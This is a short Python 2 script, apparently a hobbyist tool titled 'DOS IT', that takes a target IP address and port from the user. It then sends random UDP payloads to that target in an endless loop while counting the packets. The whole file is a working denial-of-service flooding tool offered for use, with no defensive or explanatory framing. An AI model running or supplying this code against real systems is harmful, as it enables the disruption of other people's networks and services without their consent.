import socket
import os
import sys
import random
def pic():
	print("""                 DDDD  OOOO    SSS       I TTTTTTT
		 D   D O  O   S          I    T
		 D   D O  O   SSS        I    T
		 D   D O  O    S         I    T
		 DDDD  OOOO SSS          I    T       

		                                   CREATED BY: SAMEER""")


pic()

ip=raw_input("Enter target's IP: ")
port=input("Enter Port to attack: ")
bytes=random._urandom(input("Enter Bytes to send at one time: "))

sock=socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

packet=0
pic()
while True:
	
		sock.sendto(bytes,(ip,port))
		
		print "Packet sent: %s"%(packet)
		
		packet=packet+1
	
